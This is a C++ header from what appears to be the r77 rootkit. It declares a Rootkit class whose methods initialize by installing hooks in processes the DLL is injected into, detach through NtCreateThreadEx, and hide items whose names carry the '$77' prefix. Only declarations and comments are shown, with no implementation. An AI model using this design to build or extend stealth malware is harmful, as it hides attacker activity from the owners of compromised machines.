/// <summary>
/// Main entry point for r77. Initialize and Shutdown should be called by DllMain.
/// </summary>
class Rootkit
{
private:
	static bool IsInitialized;
	static HINSTANCE Module;
public:
	/// <summary>
	/// Initializes r77, writes r77 header and installs hooks.
	/// <para>This function returns false, if r77 is already injected, or if this process is either the r77 service or a helper process, or the process starts with $77.</para>
	/// </summary>
	/// <param name="module">The module of the injected DLL.</param>
	/// <returns>
	/// true, if r77 was successfully loaded;
	/// otherwise, false.
	/// </returns>
	static bool Initialize(const HINSTANCE &module);
	/// <summary>
	/// Detaches r77 from this process.
	/// </summary>
	static void Shutdown();
	/// <summary>
	/// A function that can be invoked using NtCreateThreadEx to detach r77 from this process.
	/// <para>The address of this function is written to the r77 header.</para>
	/// </summary>
	static void Detach();

	/// <summary>
	/// Determines whether a string is hidden by prefix.
	/// </summary>
	/// <param name="str">The unicode string to be checked.</param>
	/// <returns>
	/// true, if this string is hidden by prefix;
	/// otherwise, false.
	/// </returns>
	static bool HasPrefix(LPCWSTR str);
	/// <summary>
	/// Determines whether a string is hidden by prefix.
	/// </summary>
	/// <param name="str">The unicode string to be checked.</param>
	/// <returns>
	/// true, if this string is hidden by prefix;
	/// otherwise, false.
	/// </returns>
	static bool HasPrefix(UNICODE_STRING str);
};